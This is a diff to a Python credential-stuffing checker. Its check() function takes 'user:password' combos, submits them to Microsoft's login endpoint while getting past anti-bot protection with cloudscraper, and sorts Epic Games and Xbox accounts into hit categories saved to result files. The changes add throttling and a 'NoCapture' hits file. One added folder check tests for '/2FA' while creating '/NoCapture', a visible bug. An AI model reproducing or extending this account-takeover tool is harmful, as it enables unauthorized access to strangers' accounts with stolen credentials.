@@ -84,9 +84,7 @@ def check(line):
     user = line.split(':')[0].strip()
     password = line.split(':')[1].strip()
     folder = 'Results'
-    # print(user)
-    # print(password)
-    
+    # print(line)
     session = requests.sessions.session()
     scraper = cloudscraper.create_scraper()
     url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
@@ -306,6 +304,7 @@ def check(line):
             open(f'{folder}/2FA/all.txt', 'a',
             encoding='u8').write(f'{line}\n')
             checked += 1
+            time.sleep(0.1)
             return
         elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
             print(f'{red}[HEADLESS] - {white}{line}{rescolor}')
@@ -369,8 +368,14 @@ def check(line):
         response = scraper.get(url, headers=headers, cookies=response2.cookies)
         if 'Sorry, your account has too many active logins' in response.text:
                 print(f'{green}[HIT-NC] - {white}{line}{rescolor}')
+                if not os.path.exists(folder + '/2FA'):
+                    os.makedirs(folder + '/NoCapture')
+                open(f'{folder}/NoCapture/all.txt', 'a',
+                encoding='u8').write(f'{line}\n')
                 checked +=1
+                time.sleep(0.1)
                 return
+        
         elif '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                 # print(f'{yellow}[XBOX-BAN] - {white}{line}{rescolor}')
                 checked +=1
